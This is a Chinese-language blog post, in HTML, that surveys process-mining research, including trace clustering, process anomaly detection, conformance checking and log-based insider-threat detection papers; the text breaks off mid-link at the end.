        <content type="html"><![CDATA[<p>上一篇文章对流程挖掘领域的关键技术进行了总结，这篇文章主要对流程挖掘领域的研究现状进行了总结。</p><h1 id="研究团队"><a class="markdownIt-Anchor" href="#研究团队"></a> 研究团队</h1><ul><li><a href="https://scholar.google.com/citations?hl=zh-CN&amp;user=TjQYB-IAAAAJ">山东理工大学 王聪</a></li></ul><h1 id="关键词"><a class="markdownIt-Anchor" href="#关键词"></a> 关键词</h1><ul><li>流程挖掘 Process Mining</li><li>流程发现 Process Discovery</li><li>业务树 process tree</li><li>事件日志 event log</li><li>流程挖掘异常检测：知网搜索可以搜到很多毕业安徽理工大学的论文</li><li>业务流程管理</li><li>流程变体分析：企业或组织的业务流程因涉及不同的地域、人员或法规等而存在很多变体,不同流程变体的事件日志中存在差异。流程变体分析是流程挖掘的一个范畴,能够从事件日志中发现两个流程变体的差异,对流程变体进行比较分析,从而为流程标准化、流程改进和拓展等提供帮助。</li><li>“Topic=‘process mining’” and “Topic=‘Algorithm’”</li></ul><h1 id="数据集"><a class="markdownIt-Anchor" href="#数据集"></a> 数据集</h1><p>大多数流程挖掘领域的文章都是在BPIC数据集的基础上进行研究</p><p>BPIC 是 “Business Process Intelligence Challenge” 的缩写，是一个由荷兰埃因霍温理工大学（Eindhoven University of Technology）发起的年度学术竞赛。BPIC 数据集 是该比赛中发布的一系列真实业务流程事件日志数据，用于研究和测试流程挖掘（Process Mining）技术。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/asynccode" alt="img" /></p><h1 id="流程发现"><a class="markdownIt-Anchor" href="#流程发现"></a> 流程发现</h1><p>流程挖掘具有三个不同的视角：</p><ol><li>过程视角（process perspective）：关注控制流，即活动的优先关系</li><li>组织视角（organizational perspective）：关注参加的角色及其之间的关系</li><li>案例视角（case perspective）：关注case的属性</li></ol><p><strong>流程挖掘算法综述</strong></p><ul><li>2022</li><li>流程挖掘算法综述_林文祥.pdf</li></ul><p>对流程挖掘算法进行了总结</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/1280X1280.PNG" alt="img" /></p><p><strong>Algorithms for anomaly detection of traces in logs of process aware information systems</strong></p><ul><li>Information Systems  <strong>中科院二区</strong></li><li>2013</li><li><a href="https://repositorio.ufra.edu.br/jspui/bitstream/123456789/371/1/ALGORITHMS%20FOR%20ANOMALY%20DETECTION%20OF%20TRACES%20IN%20LOGS....o.pdf">https://repositorio.ufra.edu.br/jspui/bitstream/123456789/371/1/ALGORITHMS FOR ANOMALY DETECTION OF TRACES IN LOGS....o.pdf</a></li></ul><p>真实应用场景下的日志中通常包含异常执行信息，因此通过流程发现技术挖掘得到的模型并不完全标准。</p><p>针对这一问题提出了三种改进的异常检测方法：</p><ul><li>阈值算法：设置一个异常阈值，将一致性低于阈值的轨迹归为异常轨迹来实现异常检测；</li><li>迭代算法：通过多次迭代并在每次迭代中删除一致性最低的轨迹来达到过滤异常的效果；</li><li>采样算法：通过采样来减少日志中包含异常轨迹的可能性，基于假设：日志中所包含的异常数据是少量的</li></ul><p><strong>Process variant comparison: Using event logs to detect differences in behavior and business rules</strong></p><ul><li>Information Systems <strong>CCF-B</strong></li><li>2018</li><li><a href="https://www.sciencedirect.com/science/article/pii/S0306437916305257">https://www.sciencedirect.com/science/article/pii/S0306437916305257</a></li></ul><p>背景：同一个公司的同一个流程在不同部门、客户群体或时间段之间可能存在差异，如同一个银行在不同地区、时间的借贷额度可能不同，这些可以表示为<strong>同一个流程的不同变体</strong>。这些流程变体受到多种因素的影响，如年度时间、执行的地理位置或负责的资源单元等。导致企业需要深入了解比较不同流程的执行方式，进行流程优化。</p><p>现有方法的不足：现有的一些<strong>对比流程变体</strong>的方法主要关注“控制流”这一角度，但这些方法通常只能检测到统计上不显著的差异，无法识别真正有意义的行为差异。同时现有方法无法基于业务规则或性能指标的注释来有效检测流程变体之间的统计显著差异。</p><p>研究内容：作者提出了一种基于transition systems的流程变体对比方法。该方法可以从事件日志中提取信息，检测不同流程变体之间在各类测量注释（如控制流频率、时间等方面）上的统计显著差异。通过使用转移系统，可以避免依赖特定的数据挖掘算法，并且该系统可以从多种角度创建（如不仅考虑控制流，还可以考虑资源交互等）。用户还可以通过不同的参数控制结果，使其更具灵活性。</p><p><strong>Discovering Process Models that Support Desired Behavior and Avoid Undesired Behavior</strong></p><p><strong>Process mining using BPMN: relating event logs and process models</strong></p><ul><li>MODELS '16  <strong>CCF-B</strong></li><li>2016</li><li><a href="https://pure.tue.nl/ws/portalfiles/portal/4007431/1379614664264.pdf">https://pure.tue.nl/ws/portalfiles/portal/4007431/1379614664264.pdf</a></li></ul><p>提供了一种根据 BPMN 发现流程的控制流视角的方法</p><p><strong>Evaluating and Predicting Overall Process Risk Using Event Logs</strong></p><ul><li>Information Sciences  CCF-B 中科院一区</li><li>2016</li></ul><p><strong>Split miner: automated discovery of accurate and simple business process models from event logs</strong></p><ul><li>Knowledge and Information Systems <strong>CCF-B 高引用</strong></li><li>2019</li></ul><p><strong>Fuzzy Mining Adaptive Process Simplification Based on Multi-Perspective Metrics</strong></p><p>待看：</p><ul><li><p><a href="https://ieeexplore.ieee.org/abstract/document/1316839/">Workflow mining: Discovering process models from event logs</a> <strong>CCF A</strong></p></li><li><p><a href="https://ieeexplore.ieee.org/abstract/document/1644726/">Discovering expressive process models by clustering log traces</a> <strong>CCF A</strong></p></li><li><p>OrgMiner: A Framework for Discovering User-Related Process Intelligence from Event Logs 2020</p></li><li><p>Hidden markov model for process mining of parallel business processes</p></li></ul><h1 id="轨迹聚类"><a class="markdownIt-Anchor" href="#轨迹聚类"></a> 轨迹聚类</h1><h2 id="为什么要使用轨迹聚类"><a class="markdownIt-Anchor" href="#为什么要使用轨迹聚类"></a> 为什么要使用轨迹聚类</h2><p>在灵活性较高的流程中，流程的实际执行情况可能会因不同情况而有所偏离，为非结构化，从而导致所有可能的行为都显示在单个流程模型中**，复杂且难以解读**。在这些领域，生成的流程模型往往存在大量分支和变异（即<strong>意大利面条式流程模型</strong>），使得模型的直观性和可解释性较差。</p><p>这时候可以使用轨迹聚类的方式来进行预处理，找出日志中不同聚类簇，每个簇单独展示了一个特定的过程模型（即完整模型中的部分行为），通过刻画局部行为来降低模型的复杂度，使得后续生成的流程模型更加简单，可读性高。</p><h2 id="轨迹聚类和概念漂移"><a class="markdownIt-Anchor" href="#轨迹聚类和概念漂移"></a> 轨迹聚类和概念漂移</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/5c9503f2-a69a-4a4c-8789-17ccd09b99f1.png" alt="5c9503f2-a69a-4a4c-8789-17ccd09b99f1" /></p><ul><li>轨迹聚类（trace clustering）：为了解决模型过于复杂的问题，可以利用轨迹聚类，将相似的业务行为聚为一个子日志，每个子日志刻画的是原始模型局部的行为。<ul><li>目的：降低了模型的复杂度</li><li>对象：模型的静态结构</li><li>方法：利用相似的业务行为进行聚类</li></ul></li><li>概念漂移（Process Drift）：为了解决因多个版本混在一起导致的挖掘模型不正确的问题，可以对日志进行概念检测，通过检测到的变化点将日志划分为多个子日志，每个子日志刻画的是业务流程的一个版本。<ul><li>目的：解决了<strong>由于业务演化带来的挖掘模型不正确问题</strong></li><li>对象：模型的动态演化过程，行为的变化</li><li>方法：通过发现行为的变化来找出日志的漂移点（也称变化点），进一步利用漂移点将日志划分为不同子日志，从而得到业务过程的不同演化版</li></ul></li></ul><h2 id="未来方向"><a class="markdownIt-Anchor" href="#未来方向"></a> 未来方向</h2><ol><li>算法层面：更加全面的流程轨迹表示方法，现有的轨迹刻画无论是字符串还是轮廓,都是人为赋予的表示方法，带有主观性。如果能更加客观且全面地表示出轨迹内容,则聚类效果会更上一层楼。这个方向可以借鉴机器学习方向的相关工作，如NLP中的词向量表示方法等。</li><li>策略层面：提出新的结构，更好地融合距离驱动和模型驱动聚类</li><li>应用层面：目前的流程轨迹聚类方法主要用于优化流程发现得到的模型结构，而没有考虑时间维度。可以考虑时间维度的模型演变，结合概念漂移，实时监测随着时间偏移、版本更新，轨迹类簇的动态变化趋势。</li></ol><h2 id="研究方法"><a class="markdownIt-Anchor" href="#研究方法"></a> 研究方法</h2><p>主要可以分成距离驱动、模型驱动和混合聚类方法</p><h3 id="基于距离驱动的聚类方法"><a class="markdownIt-Anchor" href="#基于距离驱动的聚类方法"></a> 基于距离驱动的聚类方法</h3><ol><li><p>方法</p><p>1）对日志轨迹进行刻画，将轨迹中的特征表示出来（如轨迹轮廓，traces profile）</p><p>2）通过编辑距离等方法计算出轨迹之间的相似度</p><p>3）基于传统的聚类算法将轨迹划分为不同的类</p></li><li><p>分类</p><ul><li>具体型：不对轨迹做任何转换，直接在轨迹上计算相似度。如将轨迹看成字符串后，使用最小编辑距离计算轨迹之间的相似度再聚类。</li><li>抽象型：将轨迹刻画为向量，然后再基于轨迹向量计算对轨迹之间的相似度。最常用的是轨迹轮廓profile，从不同的视角来刻画轨迹向量，将所有视角的向量聚合后得到轨迹向量。</li></ul></li></ol><h3 id="基于模型驱动的聚类方法"><a class="markdownIt-Anchor" href="#基于模型驱动的聚类方法"></a> 基于模型驱动的聚类方法</h3><p>直接从模型出发，然后通过模型与轨迹之间的评价指标(拟合度、复杂度等)来确定轨迹属于哪个类簇。其中，训练的模型可能是直接输入的，也可能通过日志中的部分数据集间接得到的。如果是间接得到的模型，那么如何选择日志中的轨迹也是个难点(如贪心策略）</p><h3 id="继承距离驱动和模型驱动的混合聚类方法"><a class="markdownIt-Anchor" href="#继承距离驱动和模型驱动的混合聚类方法"></a> 继承距离驱动和模型驱动的混合聚类方法</h3><p>距离驱动的聚类算 法考虑到了每条轨迹与其他轨迹的综合信息，即全局考虑了行为的相似度。而模型驱动算法仅考虑当前轨迹与模型的评价得分，此类算法通常采用随机 策略或者贪心策略获取最优解，容易陷入局部最优。 为此，混合聚类算法综合考虑了两者的利弊，集成了两者优势对日志轨迹进行聚类</p><h3 id="基于向量空间模型的聚类方法"><a class="markdownIt-Anchor" href="#基于向量空间模型的聚类方法"></a> 基于向量空间模型的聚类方法</h3><ol><li><p>原理：基本思路是将轨迹转换为向量空间模型，特征由以下元素定义，在这个模型中，每个轨迹被表示为一个向量，这些向量的维度由活动、过渡或k-gram的组合所决定：</p><ul><li>活动（activities）：即流程中执行的具体操作或步骤。</li><li>过渡（transitions）：即活动之间的转移或顺序。</li><li>k-gram：指的是活动的子序列，通常是k个连续的活动。</li></ul><p>基于这些向量，聚类可以采用多种技术，如：</p><ul><li>层次聚类（Agglomerative hierarchical clustering）</li><li>K均值聚类（k-means clustering）</li></ul><p>在计算聚类时，可以使用不同的距离度量（distance metrics），例如：</p><ul><li>欧几里得距离（Euclidean distance）：用于测量两个向量在几何空间中的直线距离。</li><li>Jaccard距离（Jaccard distance）：用于衡量两个集合的相似度，特别适用于集合间的比较。</li></ul></li><li><p>问题</p><p><strong>1）如何定义合适的向量空间模型（vector space model），将多个视角合并为一个统一的模型来提供更加综合的流程分析</strong></p><p>事件日志包含了多种不同视角的数据，每种视角反映了流程执行的不同方面：</p><ul><li>控制流视角（Control-flow perspective）：活动的顺序或控制流，关注活动之间的顺序关系。</li><li>组织视角（Organizational perspective）：资源的组织和分配，关注不同资源（如员工或机器）在流程中的作用和任务分配。</li><li>轨迹视角（Trace perspective）：活动的频率，关注流程中各个活动出现的频率，帮助识别流程中频繁的操作或步骤。</li><li>性能视角（Performance perspective）：时间性能，关注每个活动的执行时间或整个流程的执行时间，帮助发现瓶颈或效率问题。</li></ul></li><li><p>特点</p><ul><li><p>优点：这种方法的优势在于将轨迹转化为数学向量，便于进行标准的聚类分析和距离度量。</p></li><li><p>缺点：损失轨迹的某些细节信息</p></li></ul></li><li><p>语法方法（Syntactic techniques）</p><p>第二种方法是基于“序列的原始形式”进行聚类，方法并不对轨迹进行转化，而是直接操作原始轨迹。这些方法通常应用字符串距离度量（string distance metrics），如：</p><pre><code>- Levenshtein距离：也叫编辑距离，衡量将一个字符串转换成另一个字符串所需的最小编辑操作数（插入、删除、替换）。- 通用编辑距离（Generic edit distance）：与Levenshtein距离类似，但可能包含更多种类的编辑操作，或考虑不同操作的成本。</code></pre><p>这些字符串距离度量可以直接在标准的聚类算法中使用：</p><pre><code>- K均值聚类- 层次聚类等。</code></pre><p>特点：</p><pre><code>- 优点：保留更多的序列信息- 缺点：计算量较大，且对复杂度较高的序列处理时可能不如第一种方法高效</code></pre></li></ol><h2 id="评估方法"><a class="markdownIt-Anchor" href="#评估方法"></a> 评估方法</h2><p>基于适应度+复杂度进行评估。</p><p>基于假设：如果形成的集群是有意义的，那么由特定集群中的trace产生的过程模型应该更简单（更容易理解并且不像意大利面条那样）。</p><h2 id="关键词-2"><a class="markdownIt-Anchor" href="#关键词-2"></a> 关键词</h2><p>英文：</p><ul><li>trace clustering</li><li>log division</li><li>case similarity</li><li>concept drift</li></ul><p>中文：轨迹（日志）聚类、概念漂移（漂移 检测）＋日志划分（切割）或过程挖掘（流程挖掘</p><h2 id="综述"><a class="markdownIt-Anchor" href="#综述"></a> 综述</h2><p>面向过程挖掘的日志划分技术综述</p><ul><li>计算机学报 <strong>CCF-A</strong></li><li>2022</li><li><a href="http://cjc.ict.ac.cn/online/onlinepaper/lll-202297212756.pdf">http://cjc.ict.ac.cn/online/onlinepaper/lll-202297212756.pdf</a></li></ul><h2 id="论文"><a class="markdownIt-Anchor" href="#论文"></a> 论文</h2><p><strong>Active Trace Clustering for Improved Process Discovery</strong></p><ul><li><p>IEEE Transactions on Knowledge and Data Engineering  <strong>CCF-A</strong></p></li><li><p>2013</p></li><li><p>数据集：</p></li><li><p>代码：ProM插件ActiTrac</p><ul><li>依赖HeuristicsMiner算法进行流程发现，ICS-fitness来进行适应度</li></ul></li><li><p>问题：传统聚类方法过于关注如何实现组内相似性高、组间相似性低的目标，而忽略了实际使用场景的目标：在轨迹聚类的背景下，这种目标是生成高质量（准确性高、复杂性低）的过程模型。即传统聚类算法并没有考虑到产生的过程模型是否足够高质量</p></li><li><p>方法</p><ul><li><p>基于主动学习的思想，本文提出了一种新的主动轨迹聚类方法，通过自顶向下的贪婪算法解决问题，不依赖向量空间模型或相似性度量。目标是找到一种轨迹分布，使得各组流程模型的综合准确性最大化。</p></li><li><p>选择阶段：通过选择性采样策略逐步添加轨迹，创建一个满足精度要求的流程模型。选择出现频率最高的轨迹作为一个聚类簇，每次从剩余轨迹集合中选取一个轨迹加入聚类簇，使用HeuristicsMiner算法对聚类簇生成流程模型。如果模型的fitness保持高于目标fitness，则继续添加新的轨迹到聚类簇中，直到聚类模型达到指定精度并满足最小聚类大小要求，则进入下一阶段。</p></li><li><p>前瞻阶段：确定是否可以将剩余轨迹加入当前聚类，而不显著降低流程模型的准确性。</p></li><li><p>残余轨迹处理阶段：处理未被分配的轨迹，防止出现不平衡聚类。将剩余轨迹独立创建新的聚类，或根据个体轨迹对已创建的流程模型的适配度，将其分配到现有聚类中。研究中优先采用第二种方法，以避免形成大小严重不均的聚类，从而影响模型评估结果。</p></li></ul></li></ul><p><strong>Trace Clustering in Process Mining</strong></p><ul><li>BPM 2008会议</li><li>ProM插件：Trace Clustering</li><li>数据集：阿姆斯特丹 AMC 医院（荷兰一家大型学术医院）的流程日志</li><li>方法：本文提出了一种基于轨迹（trace）聚类的方法。轨迹聚类的核心思路是将事件日志分割成多个<strong>同质性较高的子集</strong>，然后对每个子集分别创建流程模型。通过将事件日志划分为多个相似的子集，能够生成更易于理解的流程模型，从而提升复杂环境下的流程挖掘效果。<ul><li>trace表征：构建活动频次向量，再构建活动参与者频次向量（也可以理解为属性、设备 id），串联后表示这条trace的向量，用欧几里得距离来度量每两条轨迹的距离。<ul><li><strong>过渡轮廓（Transition Profile）</strong>：此轮廓的指标项是轨迹中直接的跟随关系。例如，对于活动名称对〈A, B〉，该轮廓的指标值是“事件A之后紧接事件B”的次数。这种轮廓对于比较轨迹的行为很有用。</li><li><strong>案例属性轮廓（Case Attributes Profile）</strong>：此轮廓的指标项是案例的数据属性。在许多实际场景中，轨迹通常会带有元信息，可以通过该轮廓进行比较。</li><li><strong>事件属性轮廓（Event Attributes Profile）</strong>：此轮廓的指标项是日志中所有事件的数据属性。指标值表示轨迹中具有某一特定属性的事件数量。这种轮廓可以通过比较事件的元信息来捕捉轨迹的相似性。</li><li><strong>性能轮廓（Performance Profile）</strong>：与其他轮廓不同，性能轮廓具有一组预定义的指标项。例如，轨迹的大小定义为其事件数量。如果有时间戳信息，还可以进一步测量案例的持续时间，以及每条轨迹中事件间时间差的最小值、最大值、平均值和中值。</li></ul></li><li>聚类：K-means Clustering、Quality Threshold Clustering、Agglomerative Hierarchical Clustering、Self-Organizing Map</li></ul></li></ul><p><strong>Trace Clustering Based on Conserved Patterns: Towards Achieving Better Process Models</strong></p><ul><li><p>BPM 2009会议</p></li><li><p>数据集：飞利浦医疗保健日志</p></li><li><p>方法：提出了一种轨迹聚类方法，围绕最大重复子序列相关构建六个特征组成的特征集，将所有轨迹的保守子序列汇总得到所有轨迹的特征集，将这些特征作为向量的维度，用二进制或计数来填充向量。如果轨迹包含该子序列，则该维度为1，否则为0。使用凝聚层次聚类技术进行聚类</p></li></ul><p><strong>A Co-Training Strategy for Multiple View Clustering in Process Mining</strong></p><ul><li>Ieee Transactions On Services Computing  <strong>CCF-A</strong></li><li>2015</li><li>问题：在基于向量空间模型的轨迹聚类方法中，存在多个视角，先前的研究大多单独对每个视角进行聚类。如果能够将多个视角的信息同时融入聚类过程，能够提供更精确的聚类划分，从而改善流程发现的效果。然而，问题在于直接将多个视角的特征连接成一个长向量并不合适。因为这些视角有不同的性质，简单地将它们拼接成一个高维的特征向量可能会带来“维度灾难”（curse of dimensionality）问题，即高维空间中的稀疏性可能导致聚类效果的下降。</li><li>数据集：Process Mining Repository中的11个数据集，涵盖了广泛的应用领域，包括 <strong>问题管理、医疗过程、贷款申请、电话修理、期刊评审</strong> 等。</li><li>方法：为了避免维度灾难，作者提出了一种<strong>多视角<strong><strong>聚类</strong></strong>方法</strong>（multiple view clustering）。<ul><li>分别从活动、资源、性能和变迁四个视角构建相似度矩阵，采用协同训练的策略：对于每个视角，基于该视角上一轮得到的聚类矩阵和其他视角的相似度矩阵，更新该视角的相似度矩阵，根据所有视角的聚类结果计算平均的轮廓系数，如果不再提高或达到最大迭代次数，则停止迭代。</li><li>如何将迭代完成后的多个视角的聚类结果进行整合，得到最终的<strong>共识聚类结果</strong>：对于所有视角计算的相似度矩阵，我们将它们加和并归一化，得到一个共识相似度矩阵。这个矩阵代表了所有视角中，轨迹间的整体相似度，基于该矩阵进行聚类将产生一个综合所有视角信息的最终聚类结果。</li><li>评估聚类生成簇的重要性：使用 ProM 框架中的 Alpha++ 挖掘生成流程模型，计算复杂性相关指标并进行一致性检查</li><li><blockquote><p><a href="https://blog.csdn.net/q7w8e9r4/article/details/132575400">半监督学习算法中的协同训练(Co-training)_协同训练算法-CSDN博客</a></p></blockquote></li></ul></li></ul><p><strong>act2vec, trace2vec, log2vec, and model2vec: Representation Learning for Business Processes</strong></p><ul><li>BPM 2018  <strong>高引用</strong></li><li>2018</li><li>方法：通过NLP中词向量的表示方法，将轨迹或者日志片段表示为向量</li></ul><p><strong>Retrieval and clustering for supporting business process adjustment and analysis</strong></p><ul><li>Information Systems <strong>CCF-B</strong></li><li>2014</li><li>方法：作者考察实际日志发现很多活动的属性是无法量化的，如内容相同但名称不同、活动之间存在重叠等。因此，定义了近邻图距离(neighbors graph distance)来计算轨迹之间的相似度，最后使用非加权组平均法进行层次聚合</li></ul><h1 id="流程异常检测"><a class="markdownIt-Anchor" href="#流程异常检测"></a> 流程异常检测</h1><h2 id="背景知识"><a class="markdownIt-Anchor" href="#背景知识"></a> 背景知识</h2><p>业务流程过程中的异常情况可以分为行为异常、时间异常和属性异常3类。</p><ul><li>行为异常：从控制流视角出发，主要关注活动执行顺序的正确性，如流程执行过程中由于某个错误的操作而导致活动被重复执行；</li><li>时间异常：从时间视角出发，主要关注活动的持续时间以及实例总的执行时间是否合理，如当活动执行的持续时间是平时的几倍或实例的总执行时间超过预期等；</li><li>属性异常：从其他属性值出发，主要关注属性状态是否正常，如从资源属性上看，若活动a被从未执行过它的资源执行，这就属于偏环离原有预设的行为，将被视为属性异常情状况。</li></ul><p><strong>传统的业务流程异常检测通常借助一致性检查技术</strong>来实现，即通过将日志中记录的执行趋势与标准的参考流程类型进行对齐，进一步检测是否存在异常。该类方法需要借助一个标准的参考流程模型，用于表征流程中全部的正常执行情况。</p><p>同时，大多传统一致性检查技术仅关注控制流。</p><h2 id="分类"><a class="markdownIt-Anchor" href="#分类"></a> 分类</h2><ol><li><p><strong>基于流程挖掘的业务流程异常检测方法</strong>（传统一致性检验算法）</p><p>1）原理：通过流程发现从事件日志中提取流程模型，进一步进行一致性检验。例如：基于token重演、基于alignment</p><p>2）缺点：</p><ul><li>只能检测控制流级别的异常，不能检测属性级别的异常</li><li>依赖数据集质量，数据集中不能存在任何异常轨迹：难以实现，因为数据集中总是会存在一些异常的</li><li>过于严格，假阳性率高</li></ul></li><li><p>基于机器学习的一致性检验算法</p><ul><li><p>监督：因为标记数据获取困难，所以比较少见</p></li><li><p>无监督（主要）</p></li><li><p>半监督</p></li></ul></li><li><p>基于深度学习的一致性检验算法</p></li></ol><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><ol><li><p>通过流程发现从事件日志中挖掘出流程模型，然后通过一致性检查来检测异常行为</p><p>缺点：不利用事件属性，因此不能检测属性级别的异常</p></li><li><p>基于似然图（likelihood graph）的方法：将事件属性融入一个扩展的似然图，以包括流程的重要特征，从而能够更加全面地刻画流程行为。</p><ul><li><p>优势：将事件属性纳入模型中，使得检测异常时不仅能考虑到事件的顺序，还能分析属性层面的异常。</p></li><li><p>缺点：尽管似然图方法更具灵活性，但它依赖于属性连接到图中的离散顺序，这可能会带来偏差。也就是说，不同属性之间的顺序关系可能会影响图的结构，从而对检测结果产生一定的偏向性。</p></li></ul></li></ol><h2 id="局限性"><a class="markdownIt-Anchor" href="#局限性"></a> 局限性</h2><ol><li><p>基于流程挖掘的业务流程异常检测（一致性检验）</p><p>挖掘过程模型、轨迹对齐与托肯重演等操作需要占用大量资源且效率较低。</p></li><li><p>基于ML的业务流程异常检测</p><ul><li>数据集：难以获取全面的标记数据（异常行为的种类太多，难以全面覆盖）</li><li>在事件日志特征工程中过于依赖专家知识去手动添加特征，泛化能力差。</li><li>仅实现片面的单一维度特征提取，且事件日志中轨迹间隐含的复杂关系未能显式呈现并进行特征抽取,难以实现全面准确的</li></ul></li></ol><h2 id="关键词-3"><a class="markdownIt-Anchor" href="#关键词-3"></a> 关键词</h2><ul><li><p>流程异常检测 process anomaly detection</p></li><li><p>流程聚类 trace clustering</p></li><li><p>异常检测 Anomaly detection</p></li><li><p>合规性检测 conformance checking</p></li><li><p>“process mining” AND “anomaly detection”</p></li><li><p>业务流程异常检测 business process anomaly detection</p></li><li><p>离散序列异常检测 Discrete Sequences Anomaly Detection</p><blockquote><p>离散序列是指由一系列按照特定顺序排列的离散事件或符号构成的序列。每个事件通常来自一个有限的符号集，并且在序列中具有顺序关系。离散序列在许多领域中很常见，比如网络日志、机器操作记录、用户行为轨迹等。</p><p>例子：假设我们有一家电商网站的用户操作日志，其中每个用户的操作可以是“登录”（Login）、“查看商品”（View）、“加入购物车”（Add to Cart）、和“结账”（Checkout）。我们可以将这些操作记录为一个离散序列。</p></blockquote></li></ul><h2 id="综述-2"><a class="markdownIt-Anchor" href="#综述-2"></a> 综述</h2><p><strong>流程挖掘一致性检验算法研究综述</strong></p><ul><li>2023</li><li>流程挖掘一致性检验算法研究综述_赵百威.pdf</li></ul><p>总结了一致性检验算法，包括：基于token重演的一致性检验算法，基于日志中活动行为模型的一致性检验算法和基于模型和日志对齐的一致性检验算法。</p><p><strong>Conformance checking: A state-of-the-art literature review</strong></p><ul><li>2019 <strong>高引用</strong></li><li>总结了流程挖掘领域的一致性检验算法</li></ul><h2 id="论文-2"><a class="markdownIt-Anchor" href="#论文-2"></a> 论文</h2><p><strong>基于上下文感知的多角度业务流程在线异常检测方法</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/88057059-185b-4bff-8e08-d8576e1141d1.png" alt="88057059-185b-4bff-8e08-d8576e1141d1" /></p><ul><li>2021</li><li>数据集：Helpdesk和BPIC2012，手动生成异常标记</li><li>方法：<ul><li>模型训练：对训练集使用流程发现算法构建Petri网模型表征业务流程，采用轨迹重演的方法提取行为上下文（控制流视角，包括事件的全局和局部行为），数据上下文信息（数据流视角，包括时间和属性），将每个事件的上下文信息向量（即上面提到的四个向量）级联得到该事件的编码向量，输入LSTM训练异常检测模型。</li><li>异常检测：对待检测的轨迹进行上下文提取，然后将其编码为相应的数据形式并输入到训练得到的异常检测模型中最后，检测模型的输出结果将被发送给相关人员用于决策，同时最终的成绩结果和当前的成绩数据将被保存下来用于检测模型类型的增量更新，以提高检测模型的准确性</li></ul></li></ul><p><strong>基于注意力机制的业务过程异常检测方法</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/038eea39-9f0f-40f5-88ae-bcc769da1cac.png" alt="038eea39-9f0f-40f5-88ae-bcc769da1cac" /></p><ul><li><p>2021</p></li><li><p><a href="https://kns.cnki.net/kcms2/article/abstract?v=QenloEQs_R9GLM18p0kLALImNNQtxUU3FQA13au2gwucGSwY73mQdaVVja7fh_C7XpJ391tpyU1yrtuovbdZ5Q0Zr3cqvCJDhGRsXDmMOv4tqBSa4EML4Jj7jl2qdsH4BJO5olizAf6ke9UquwRpZNXTOReAeRJthCogJsOoErQpFGVCm12yjDHTb0ieR2Aa&amp;uniplatform=NZKPT&amp;language=CHS">基于注意力机制的业务过程异常检测方法 - 中国知网</a></p></li><li><p>论文：基于注意力机制的业务过程异常检测方法_孙晋永</p></li><li><p>方法：</p><p>提取事件日志中的控制流特征和数据流特征，输入构建的Transformer模型（适合处理具有长距离依赖、存在重复出现子序列的业务过程的事件序列，注意力机制能够捕捉长期和短期的事件或事件属性的依赖关系），得到异常评分并设置阈值。</p><p>不需要从事件日志中挖掘出过程模型，不需要领域知识，也不需要对事件日志进行手动标记的方法</p></li></ul><p><strong>Balanced multi-perspective checking of process conformance</strong></p><ul><li>Computing 中科院三区 <strong>高引用</strong></li><li>2016</li><li>问题：传统的合规性检查方法主要专注于控制流（control flow），即事件和活动的顺序、流向等，忽略了数据依赖（数据的输入输出关系）、资源分配（谁执行哪些任务）以及时间约束（任务执行的时间要求）。即使考虑到其他视角，也会是优先考虑控制流视角，这导致其他视角只是作为次要因素进行考虑</li></ul><p><strong>Deep reinforcement learning for data-efficient weakly supervised business process anomaly detection</strong></p><ul><li><p>J Big Data 中科院二区</p></li><li><p>2023</p></li><li><p>问题：因为标记数据的难以获取，业务流程异常检测领域的大部分方法聚焦在无监督学习上面。但是因为无监督学习仅依赖于异常分布的假设，缺乏对真实异常的先验知识。同时目前的半监督方法不适用于新异常行为的检测。</p></li><li><p>研究内容：</p><ul><li>首次将深度强化学习方法来检测业务流程领域异常的</li></ul></li></ul><p><strong>BINet: multivariate business process anomaly detection using deep learning</strong></p><ul><li>International Conference on Business Process Management  高引用</li><li>2018</li></ul><p><strong>Anomaly detection for industrial control systems using process mining</strong></p><ul><li>COSE  CCF-B</li><li>2018</li></ul><h1 id="内部威胁检测"><a class="markdownIt-Anchor" href="#内部威胁检测"></a> 内部威胁检测</h1><h2 id="论文-3"><a class="markdownIt-Anchor" href="#论文-3"></a> 论文</h2><p><strong>Log2vec: A Heterogeneous Graph Embedding Based Approach for Detecting Cyber Threats within Enterprise</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/8da5f89b-19b6-48f4-b73e-7fff24061fcd.png" alt="8da5f89b-19b6-48f4-b73e-7fff24061fcd" /></p><ul><li><p>CCS 安全四大顶会</p></li><li><p>2019</p></li><li><p>问题：</p></li><li><p>数据集：CERT r6.2、LANL</p></li><li><p>代码：未开源</p></li><li><p>研究问题</p><p>信息系统在当代企业中至关重要，但面临多种威胁，其中包括：</p><ul><li>内部威胁（Insider Threats）：由拥有合法访问权限的内部员工发起的攻击，他们可能利用权限破坏系统的机密性、完整性或可用性。</li><li>高级持续性威胁（APT）：外部攻击者通过初始账户或主机的漏洞进入系统，随后利用网络内部横向扩展并窃取机密数据。<br />这两种攻击对现代企业的威胁严重且代价高昂。现有方法基于用户行为建模（例如将日志操作转化为序列，利用深度学习进行预测），误报高，局限大</li></ul></li><li><p>研究内容</p><p>本文考虑日志条目中的顺序、逻辑、交互关系，将日志数据建模为异构图，利用图嵌入技术，将异构图中的日志操作转化为高维向量（操作表示），将异常的日志操作聚类到单独的群组中，辅助识别恶意操作。</p></li><li><p>局限性</p><ul><li>图规则仅仅针对内部威胁和APT两种场景，但是还存在其他的攻击场景，需要构建新的图规则来将新的关系纳入异质图中</li><li>误报率高，考虑采用combating threat alert fatigue方法对抗</li><li>图嵌入和检测算法的优化，如考虑使用GNN等来进行图嵌入等</li></ul></li></ul><p><strong>Audit-LLM: Multi-Agent Collaboration for Log-based Insider Threat Detection</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/65a1bf54-fd4e-436d-a2d2-2edda4448adb.png" alt="65a1bf54-fd4e-436d-a2d2-2edda4448adb" /></p><ul><li>preprint</li><li><a 